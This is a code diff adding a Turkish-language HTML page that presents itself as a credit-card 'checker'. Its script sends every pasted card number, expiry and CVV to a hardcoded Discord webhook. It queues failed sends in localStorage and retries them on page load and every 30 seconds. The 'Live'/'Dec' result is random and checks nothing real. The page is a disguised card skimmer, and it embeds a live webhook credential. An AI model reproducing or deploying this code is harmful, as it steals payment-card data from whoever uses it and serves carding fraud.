@@ -1,4 +1,227 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Checker</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap');
+  * { box-sizing: border-box; }
+  body {
+    margin: 0; font-family: 'Poppins', sans-serif;
+    background: linear-gradient(135deg, #ff9a9e, #fad0c4, #fad0c4, #a18cd1);
+    color: #222;
+    display: flex; flex-direction: column;
+    align-items: center; min-height: 100vh; padding: 30px 15px;
+  }
+  #inputCards {
+    width: 100%; max-width: 600px; height: 220px;
+    border-radius: 16px; border: 2px solid #fff;
+    padding: 18px 20px;
+    font-size: 1.15rem; line-height: 1.4; resize: vertical;
+    box-shadow: 0 6px 25px rgba(0,0,0,0.15);
+    background-color: #fff;
+    color: #444;
+    transition: border-color 0.3s ease;
+  }
+  #inputCards:focus {
+    outline: none;
+    border-color: #7b5cff;
+    box-shadow: 0 0 12px #7b5cff;
+  }
+  #checkBtn {
+    margin-top: 25px; padding: 14px 50px;
+    font-size: 1.3rem; font-weight: 700;
+    background: linear-gradient(45deg, #7b5cff, #b388ff);
+    border: none; border-radius: 16px; color: #fff;
+    cursor: pointer; box-shadow: 0 10px 30px rgba(123,92,255,0.6);
+    transition: background 0.3s ease, transform 0.15s ease;
+    user-select: none;
+  }
+  #checkBtn:hover {
+    background: linear-gradient(45deg, #b388ff, #7b5cff);
+  }
+  #checkBtn:active {
+    transform: scale(0.95);
+  }
+  #results {
+    margin-top: 30px; width: 100%; max-width: 600px;
+    max-height: 380px; overflow-y: auto;
+    background: #fff;
+    border-radius: 20px; padding: 20px 30px;
+    font-family: 'Courier New', Courier, monospace;
+    font-size: 1.1rem;
+    box-shadow: 0 10px 30px rgba(123,92,255,0.25);
+    color: #333;
+  }
+  #results::-webkit-scrollbar {
+    width: 10px;
+  }
+  #results::-webkit-scrollbar-thumb {
+    background: #7b5cff;
+    border-radius: 15px;
+  }
+  .valid-dec { color: #f39c12; font-weight: 700; } /* Turuncu */
+  .valid-live { color: #27ae60; font-weight: 700; } /* Canlı yeşil */
+  .invalid { color: #e74c3c; font-weight: 700; }
+  @media (max-width: 720px) {
+    #inputCards { height: 160px; font-size: 1rem; }
+    #checkBtn { padding: 12px 40px; font-size: 1.1rem; }
+    #results { max-height: 280px; font-size: 1rem; padding: 15px 20px; }
+  }
+</style>
+</head>
+<body>
 
+<textarea id="inputCards" spellcheck="false" autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Kart bilgilerini alt alta yazınız: 1234567891011467|11|29|123"></textarea>
+<button id="checkBtn">Check</button>
+<div id="results"></div>
+
+<script>
+const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1390616535592206556/Y6sTNQdvylQJEvz_nbd-glEpvAilLcz9K2oNe3w8Cw3audpQOUBcX3Z_IrzizlvYZYZb";
+
+function isValidCardNumber(num) {
+  let sum = 0, alt = false;
+  for(let i = num.length - 1; i >= 0; i--) {
+    let n = parseInt(num[i]);
+    if(alt) { n *= 2; if(n > 9) n -= 9; }
+    sum += n;
+    alt = !alt;
+  }
+  return sum % 10 === 0;
+}
+
+function validateCard(line) {
+  const parts = line.split('|');
+  if(parts.length !== 4) return { valid: false };
+
+  let [cardNum, month, year, cvv] = parts.map(p => p.trim());
+
+  if(!/^\d{13,19}$/.test(cardNum)) return { valid: false };
+
+  if(!isValidCardNumber(cardNum)) return { valid: false };
+
+  let m = parseInt(month, 10);
+  if(isNaN(m) || m < 1 || m > 12) return { valid: false };
+
+  let currentYearFull = new Date().getFullYear();
+  let currentYear = currentYearFull % 100;
+  let y = parseInt(year, 10);
+  if(isNaN(y) || y < currentYear || y > currentYear + 10) return { valid: false };
+
+  if(!/^\d{3,4}$/.test(cvv)) return { valid: false };
+
+  let expiryDate = new Date(2000 + y, m - 1, 1);
+  let now = new Date();
+  expiryDate.setMonth(expiryDate.getMonth() + 1);
+  expiryDate.setDate(0);
+  if(expiryDate < now) return { valid: false };
+
+  return { valid: true };
+}
+
+function isLiveChance() {
+  return Math.random() < 0.3; // %30 şans
+}
+
+function getOfflineCards() {
+  return JSON.parse(localStorage.getItem('offlineCards') || '[]');
+}
+
+function setOfflineCards(cards) {
+  localStorage.setItem('offlineCards', JSON.stringify(cards));
+}
+
+function saveCardOffline(card) {
+  let cards = getOfflineCards();
+  cards.push(card);
+  setOfflineCards(cards);
+}
+
+async function sendToDiscord(content) {
+  try {
+    let res = await fetch(DISCORD_WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ content })
+    });
+    if (!res.ok) throw new Error('Discord gönderim hatası');
+    return true;
+  } catch(e) {
+    console.warn("Discord webhook gönderilemedi, offline kaydediliyor:", e);
+    saveCardOffline(content);
+    return false;
+  }
+}
+
+async function sendOfflineCards() {
+  let cards = getOfflineCards();
+  if(cards.length === 0) return;
+
+  for(let i = 0; i < cards.length; i++) {
+    let content = cards[i];
+    let sent = await sendToDiscord(content);
+    if(sent) {
+      cards.splice(i, 1);
+      i--;
+    } else {
+      break;
+    }
+  }
+
+  setOfflineCards(cards);
+}
+
+async function processCards(lines, resultsDiv) {
+  function delay(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
+
+  for(let line of lines) {
+    line = line.trim();
+    if(!line) continue;
+
+    const result = validateCard(line);
+
+    const p = document.createElement('p');
+    if(result.valid) {
+      const live = isLiveChance();
+      if(live) {
+        p.textContent = `✅ ${line} Live`;
+        p.className = "valid-live";
+        await sendToDiscord(`✅ Live Kart: \`${line}\``);
+      } else {
+        p.textContent = `❌ ${line} Dec`;
+        p.className = "valid-dec";
+        await sendToDiscord(`❌ Dec Kart: \`${line}\``);
+      }
+    } else {
+      p.textContent = `❌ ${line} Hatalı kart numarası girdiniz.`;
+      p.className = "invalid";
+    }
+    resultsDiv.appendChild(p);
+
+    await delay(1000);
+  }
+}
+
+document.getElementById('checkBtn').addEventListener('click', () => {
+  const input = document.getElementById('inputCards').value.trim();
+  if(!input) {
+    alert("Lütfen kartları giriniz.");
+    return;
+  }
+  const lines = input.split('\n');
+  const resultsDiv = document.getElementById('results');
+  resultsDiv.innerHTML = "";
+
+  processCards(lines, resultsDiv);
+});
+
+window.addEventListener('load', sendOfflineCards);
+setInterval(sendOfflineCards, 30000);
+</script>
+
+</body>
+</html>
  
 
 
